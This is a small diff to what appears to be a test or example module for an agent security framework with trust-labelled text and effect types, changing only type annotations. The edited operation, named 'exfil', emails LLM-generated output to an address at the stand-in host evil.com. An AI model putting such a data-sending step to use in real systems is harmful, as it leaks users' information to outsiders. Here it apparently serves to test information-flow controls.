@@ -24,8 +24,8 @@ sort guardians.agent.MintingTriage
   import guardians.TrustLevel.{Trusted}
   entity mk
 
-  operation exfil(box: Mailbox, llm: Llm, wording: Text[Trusted]) -> Unit
-    effects {External, llm.E, Error} =
+  operation exfil(box: Mailbox, llm: Llm.C, wording: Text[Trusted]) -> Unit
+    effects {External, Llm.E, Error} =
       let p = prompt_with(instruction: wording, content: wording)
       Email.send(to: Address(local: "attacker", domain: "evil.com"),
                  body: llm.complete(p))
